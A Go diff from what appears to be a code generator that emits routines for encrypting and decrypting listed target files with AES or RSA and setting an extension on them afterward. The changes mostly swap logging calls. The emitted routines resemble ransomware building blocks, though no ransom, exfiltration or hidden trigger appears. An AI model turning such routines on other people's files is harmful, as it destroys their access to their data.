@@ -23,7 +23,7 @@ func encrypt(value string, s_json string) ([]string, string) {
 	data_object.Add_go_function([]string{
 		fmt.Sprintf("func %s(){", system_call),
 		"if spine.crypt.method == \"\" || len(spine.crypt.target) == 0 || (spine.crypt.aes_key_length == 0 && spine.crypt.rsa_key_length == 0) {",
-		"notify.Log(\"Method, target or/and key has not been set for decryption\", \"3\", spine.logging)",
+		"spine.log(\"Method, target or/and key has not been set for decryption\")",
 		"return",
 		"}",
 		"for _, target := range spine.crypt.target{",
@@ -31,7 +31,7 @@ func encrypt(value string, s_json string) ([]string, string) {
 		"gut, err := ioutil.ReadFile(target)",
 
 		"if err != nil{",
-		"notify.Log(err.Error(), spine.logging, \"3\")",
+		"spine.log(err.Error())",
 		"return",
 		"}",
 		"enc := \"\"",
@@ -41,7 +41,7 @@ func encrypt(value string, s_json string) ([]string, string) {
 		"\tcase \"aes\":",
 		"cipher, err := aes.NewCipher([]byte(spine.crypt.aes_key))",
 		"if err != nil{",
-		"notify.Log(err.Error(), spine.logging, \"3\")",
+		"spine.log(err.Error())",
 		"return",
 		"}",
 		"for (len(gut) < spine.crypt.aes_key_length){",
@@ -54,7 +54,7 @@ func encrypt(value string, s_json string) ([]string, string) {
 		"\tcase \"rsa\":",
 		"enc_byte, err := rsa.EncryptOAEP(sha256.New(), rand.Reader, &spine.crypt.rsa_public, []byte(gut), nil)",
 		"if err != nil{",
-		"notify.Log(err.Error(), spine.logging, \"3\")",
+		"spine.log(err.Error())",
 		"return",
 		"}",
 		"enc = hex.EncodeToString(enc_byte)",
@@ -200,8 +200,7 @@ func add_target(value string, s_json string) ([]string, string) {
 
 	data_object.Add_go_function([]string{
 		fmt.Sprintf("func %s(repr []int){", system_call),
-		"target := spine.alpha.construct_string(repr)",
-		"target = spine.variable.get(target)",
+		"target := spine.variable.get(spine.alpha.construct_string(repr))",
 		"if target != \"\"{",
 		"spine.crypt.add_target(target)",
 		"}",
@@ -226,7 +225,7 @@ func set_after_extension(value string, s_json string) ([]string, string) {
 
 	data_object.Add_go_function([]string{
 		fmt.Sprintf("func %s(repr []int){", system_call),
-		"target := spine.alpha.construct_string(repr)",
+		"target := spine.variable.get(spine.alpha.construct_string(repr))",
 		"spine.crypt.extension = target",
 		"}"})
 
@@ -251,7 +250,7 @@ func decrypt(value string, s_json string) ([]string, string) {
 	data_object.Add_go_function([]string{
 		fmt.Sprintf("func %s(){", system_call),
 		"if spine.crypt.method == \"\" || len(spine.crypt.target) == 0 || (spine.crypt.aes_key_length == 0 && spine.crypt.rsa_key_length == 0) {",
-		"notify.Log(\"Method, target or/and key has not been set for decryption\", \"3\", spine.logging)",
+		"spine.log(\"Method, target or/and key has not been set for decryption\")",
 		"return",
 		"}",
 		"for _, target := range spine.crypt.target{",
@@ -260,7 +259,7 @@ func decrypt(value string, s_json string) ([]string, string) {
 		"gut, err := ioutil.ReadFile(target)",
 
 		"if err != nil{",
-		"notify.Log(err.Error(), spine.logging, \"3\")",
+		"spine.log(err.Error())",
 		"return",
 		"}",
 		"dec := \"\"",
@@ -270,12 +269,12 @@ func decrypt(value string, s_json string) ([]string, string) {
 		"\tcase \"aes\":",
 		"cipher, err := aes.NewCipher([]byte(spine.crypt.aes_key))",
 		"if err != nil{",
-		"notify.Log(err.Error(), spine.logging, \"3\")",
+		"spine.log(err.Error())",
 		"return",
 		"}",
 		"cipher_text, err := hex.DecodeString(string(gut[:]))",
 		"if err != nil{",
-		"notify.Log(err.Error(), spine.logging, \"3\")",
+		"spine.log(err.Error())",
 		"return",
 		"}",
 		"buffer := make([]byte, len(cipher_text))",
@@ -285,13 +284,13 @@ func decrypt(value string, s_json string) ([]string, string) {
 		"\tcase \"rsa\":",
 		"buffer, err := hex.DecodeString(string(gut[:]))",
 		"if err != nil{",
-		"notify.Log(err.Error(), spine.logging, \"3\")",
+		"spine.log(err.Error())",
 		"return",
 		"}",
 
 		"buffer, err = spine.crypt.rsa_private.Decrypt(nil, buffer, &rsa.OAEPOptions{Hash: crypto.SHA256})",
 		"if err != nil{",
-		"notify.Log(err.Error(), spine.logging, \"3\")",
+		"spine.log(err.Error())",
 		"return",
 		"}",
 
@@ -323,7 +322,7 @@ func decrypt(value string, s_json string) ([]string, string) {
 
 //
 //
-//
+// Removes every previously added target
 //
 //
 func clean_targets(value string, s_json string) ([]string, string) {
